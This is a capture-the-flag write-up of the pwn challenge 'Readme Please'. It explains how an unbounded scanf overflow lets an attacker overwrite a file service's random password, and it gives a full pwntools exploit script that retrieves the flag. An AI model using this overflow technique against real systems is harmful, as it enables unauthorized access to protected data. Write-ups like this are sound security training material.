https://ctftime.org/event/2647

# Readme Please (pwn)

I made a very secure file reading service.

nc readme-please.ctf.pearlctf.in 30039

## Analysis

`main` @ `0x140d`

- Populates `local_98` with a random password
- In a loop:
- Asks for a file to open by name
- If the file is called `flag.txt` it checks the password by calling `scanf("%s", local_108)`
    - This allows us to overflow the buffer into the password at `local_98`

## Solution

1) Try to open the flag
2) Supply a password such that the password buffer now starts with b"A\x00"
3) Try to open the flag again
4) Supply b"A\x00" as the password

```python
#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./main", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("readme-please.ctf.pearlctf.in", 30039)

p.sendlineafter(b"file name:", b"files/flag.txt")

payload = b"A" * ((0x108 - 0x98) + 1)
p.sendlineafter(b"Enter password: ", payload)

p.sendlineafter(b"file name:", b"files/flag.txt")

payload = b"A"
p.sendlineafter(b"Enter password: ", payload)

print(p.readuntil(b"}").decode()) # pearl{f1l3_d3script0rs_4r3_c00l}
```

## Flag
`pearl{f1l3_d3script0rs_4r3_c00l}`

smiley 2025/03/07
